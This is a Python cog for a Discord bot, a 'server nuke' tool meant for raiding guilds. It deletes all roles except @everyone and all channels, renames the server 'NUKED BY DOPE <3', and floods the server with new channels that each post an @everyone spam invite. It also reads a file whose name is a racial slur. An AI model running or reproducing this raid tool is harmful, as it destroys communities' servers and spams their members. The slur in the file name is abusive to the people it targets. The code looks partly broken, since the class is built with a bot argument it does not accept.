import asyncio

import discord


def print_error(text):
    print("[!] " + text)


def print_add(text):
    print("[+] " + text)


def print_delete(text):
    print("[-] " + text)


def print_warning(text):
    print("[WARN] " + text)


class ServerNuke:

    @staticmethod
    async def roles_delete(guild_to: discord.Guild):
        for role in guild_to.roles:
            try:
                if role.name != "@everyone":
                    await role.delete()
                    print_delete(f"Deleted Role: {role.name}")
            except discord.Forbidden:
                print_error(f"Error While Deleting Role: {role.name}")
            except discord.HTTPException:
                print_error(f"Unable to Delete Role: {role.name}")

    @staticmethod
    async def channel_delete(guild_to: discord.Guild):
        for channel in guild_to.channels:
            try:
                await channel.delete()
                print_delete(f"Deleted Channel: {channel.name}")
            except discord.Forbidden:
                print_error(f"Error While Deleting Channel: {channel.name}")
            except discord.HTTPException:
                print_error(f"Unable to Delete Channel: {channel.name}")

    @staticmethod
    async def guild_edit(guild_to: discord.Guild):
        try:
            await guild_to.edit(name="NUKED BY DOPE <3")
            print_add(f'Servername changed to {guild_to.name}')
        except discord.Forbidden:
            print_error(f"Error while editing Guild: {guild_to.name}")
        except discord.RateLimited as e:
            print_warning(f'Ratelimited retrying in {e.retry_after}')
            await asyncio.sleep(e.retry_after)

    @staticmethod
    async def create_channel(guild_to: discord.Guild):
        try:
            with open('niggas.txt', 'r') as file: # cuz too lazy to write new i implemented my experiment
                lines = file.readlines()
                for count in lines:
                    channel = await guild_to.create_text_channel(name="nuked-by-dope") # Channel name
                    await channel.send("@everyone discord.gg/haltestelle") # Your message
        except discord.Forbidden:
            print_error(f"Error while creating channel: {guild_to.name}")
        except discord.RateLimited as e:
            print_warning(f'Ratelimited retrying in {e.retry_after}')

def setup(bot):
    bot.add_cog(ServerNuke(bot))
